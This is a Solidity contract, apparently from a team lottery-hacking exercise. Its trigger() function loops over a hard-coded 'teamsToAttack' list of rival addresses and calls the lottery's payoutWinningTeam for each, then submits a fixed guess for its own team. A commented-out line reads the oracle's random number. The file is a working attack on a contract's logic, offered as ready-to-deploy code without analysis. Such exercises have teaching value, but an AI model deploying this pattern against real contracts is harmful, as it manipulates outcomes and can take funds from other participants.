// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// Lottery Contract 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A
// Oracle Contract 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3
// Team 11 0x9f61132889cB8738A386E2cdbA10eFA19D2880BD

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

interface ILottery {
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function payoutWinningTeam(address _team) external returns (bool);
}

contract LottoMaster// is InterfaceLottery
{
    address[] private teamsToAttack = [
        0x1aF79b22fDb9617BD9622F1E99582Adb80912C57,
        0x0BB82c275ac0d19ABBC59c95280355A4afe5765d,
        0x8D40F194a2ab4bEaF4C030452b48D4d0DBd18541,
        0x36efd039149b9F5aF6aC75d85A8d3e9088bc7d4f,
        0x226d612F5F206429E586d4f83A2B50B026fc102F,
        0x24D6b06e8161092242A5201B0e3b21d5d2093E38,
        0x8f4BA2C139A38Fb01A723236a2F19CB7B6a49eBd,
        0x9d2c4cA62900783c29b889B8b4E7A7e23fc59B59,
        0x9915aB241743C2261Eaf13135963B3B6799450AA,
        0x1b4399A7c97ae092fB4CCDc1598b2767ECB79652,
        0x6B10d5B49Cc1Be77C5A6bb3b94E5149fEB2D327D,
        0xECFeDE31E564C97Ab05ABE88786dFb2A642f69f2,
        0x159a4d49125626781a1C51C6478bb3052eED25B5,
        0x971ed3B1D66A445d20e75EdE714e64f00e9cAFF8,
        0xfA251b9DB8d1918ea3747a98602EbaE6Ff068D55,
        0x267FC01551169Ee531Be302E1Cd7018AC5EC9a96,
        0x4f941092be009194CFef956800254A81F83bd71f,
        0x43114F0b526EdC8aA40fE929488921771bef921e,
        0x60B94578e1F4901cba7620b88C8C04c674Fb803A,
        0xE6AC36dcb627663D61538cBfd74438382aD18DF1,
        0xD2570eef08b5Ff825D761a24187f966BE27deC5D,
        0x39c585414625A59405Eb5799606f43c6714EB02E,
        0xA0038Ee0dF6C2e4bFD53acbabd91959b52D02687,
        0x29A300E824437a319b417617354032f4B2538824,
        0x440B11E3334d453cCA77F5790F80Cd0df0Ca5895,
        0x744D07fbd09fC6756A502ab226eD5946e9Ccb869,
        0x5B0a5FA760db338F71C0B4B0A7bB8bcEb100156F,
        0x7c05Ef1aaedB88b1B730eDf2e4837c4DFB67F6dD,
        0x6299Ebea7Ba92d1d4A9aE92Be6CDa7bCFCAC2Eb7,
        0x9a27DBd7065f7858907E7FbB70e9C774f0193476,
        0x95047Fa3C4db38a1f9EB98AeCcC413D0bFBb1E0c,
        0x0BB82c275ac0d19ABBC59c95280355A4afe5765d];

    constructor() {
        
    }
        
    function trigger() public //payable //returns(bool _b)
    {
        //uint8 seed = 49;
        //uint256 guess = IOracle(0x0d186F6b68a95B3f575177b75c4144A941bFC4f3).getRandomNumber();
        address _lotteryContractAddr = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
        address _winners = 0x9f61132889cB8738A386E2cdbA10eFA19D2880BD;

        for (uint256 i = 0; i < teamsToAttack.length; i++) {
            //ILottery(_lotteryContractAddr).makeAGuess(teamsToAttack[i], 1);
            ILottery(_lotteryContractAddr).payoutWinningTeam(teamsToAttack[i]);
        }

        //ILottery(_lotteryContractAddr).makeAGuess(_winners, guess);
        ILottery(_lotteryContractAddr).makeAGuess(_winners, 555);

        //console.log(guess);
    }
}